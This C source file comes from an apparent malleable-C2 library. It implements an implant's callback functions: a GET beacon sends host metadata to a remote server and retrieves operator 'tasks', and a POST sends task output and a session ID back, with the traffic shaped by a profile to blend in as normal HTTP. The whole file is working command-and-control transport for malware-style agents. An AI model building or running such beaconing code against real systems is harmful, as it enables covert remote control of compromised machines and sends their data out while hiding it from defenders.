/**
 * Malleable - Transparent Callback API Implementation
 * 
 * High-level functions that combine request building, HTTP transport, and response parsing.
 * Link this file along with malleable_http_win.c to get full callback functionality.
 */

#include "openmalleable.h"
#include "malleable_http_win.h"
#include <string.h>
#include <stdlib.h>

malleable_error_t malleable_callback_get(
    const malleable_profile_t* profile,
    const char* variant,
    const char* host,
    int port,
    int use_https,
    const uint8_t* metadata,
    size_t metadata_len,
    uint8_t** tasks_out,
    size_t* tasks_len_out
) {
    if (!profile || !host || !metadata || !tasks_out || !tasks_len_out) {
        return MALLEABLE_ERROR_INVALID_PROFILE;
    }
    
    // Default ports
    if (port == 0) {
        port = use_https ? 443 : 80;
    }
    
    // Step 1: Build GET request with metadata
    malleable_http_request_t* request = NULL;
    malleable_error_t err = malleable_build_get_request(
        profile, variant, metadata, metadata_len, &request
    );
    if (err != MALLEABLE_SUCCESS) {
        return err;
    }
    
    // Step 2: Send HTTP request
    malleable_http_response_t* response = NULL;
    err = malleable_http_send(host, port, use_https, request, &response);
    malleable_http_request_free(request);
    
    if (err != MALLEABLE_SUCCESS) {
        return err;
    }
    
    // Step 3: Parse response and extract tasks
    err = malleable_parse_get_response(profile, variant, response, tasks_out, tasks_len_out);
    malleable_http_response_free(response);
    
    return err;
}

malleable_error_t malleable_callback_post(
    const malleable_profile_t* profile,
    const char* variant,
    const char* host,
    int port,
    int use_https,
    const uint8_t* session_id,
    size_t id_len,
    const uint8_t* output,
    size_t output_len,
    uint8_t** response_out,
    size_t* response_len_out
) {
    if (!profile || !host || !session_id || !output) {
        return MALLEABLE_ERROR_INVALID_PROFILE;
    }
    
    // Default ports
    if (port == 0) {
        port = use_https ? 443 : 80;
    }
    
    // Step 1: Build POST request with session ID and output
    malleable_http_request_t* request = NULL;
    malleable_error_t err = malleable_build_post_request(
        profile, variant, session_id, id_len, output, output_len, &request
    );
    if (err != MALLEABLE_SUCCESS) {
        return err;
    }
    
    // Step 2: Send HTTP request
    malleable_http_response_t* response = NULL;
    err = malleable_http_send(host, port, use_https, request, &response);
    malleable_http_request_free(request);
    
    if (err != MALLEABLE_SUCCESS) {
        return err;
    }
    
    // Step 3: Optionally parse response data (POST responses often empty)
    if (response_out && response_len_out && response->body_len > 0) {
        // Try to extract response data if present
        malleable_http_transaction_t* txn = malleable_find_transaction(
            profile->http_post_transactions,
            profile->num_http_post,
            variant
        );
        
        if (txn && txn->server.output) {
            // Extract and reverse transform server response
            const char* extracted = NULL;
            char* extracted_copy = NULL;
            
            switch (txn->server.output->termination.type) {
                case MALLEABLE_TERM_PRINT:
                    if (response->body && response->body_len > 0) {
                        extracted_copy = (char*)malloc(response->body_len + 1);
                        if (extracted_copy) {
                            memcpy(extracted_copy, response->body, response->body_len);
                            extracted_copy[response->body_len] = '\0';
                        }
                    }
                    break;
                    
                case MALLEABLE_TERM_HEADER:
                    for (size_t i = 0; i < response->num_headers; i++) {
                        const char* header = response->headers[i];
                        size_t name_len = strlen(txn->server.output->termination.target);
                        if (strncmp(header, txn->server.output->termination.target, name_len) == 0 &&
                            header[name_len] == ':') {
                            extracted = header + name_len + 1;
                            while (*extracted == ' ') extracted++;
                            extracted_copy = _strdup(extracted);
                            break;
                        }
                    }
                    break;
                    
                default:
                    break;
            }
            
            if (extracted_copy) {
                size_t extracted_len = strlen(extracted_copy);
                err = malleable_transform_reverse(txn->server.output, 
                                                 (uint8_t*)extracted_copy, 
                                                 extracted_len, 
                                                 response_out, 
                                                 response_len_out);
                free(extracted_copy);
            }
        }
    }
    
    malleable_http_response_free(response);
    return MALLEABLE_SUCCESS;
}
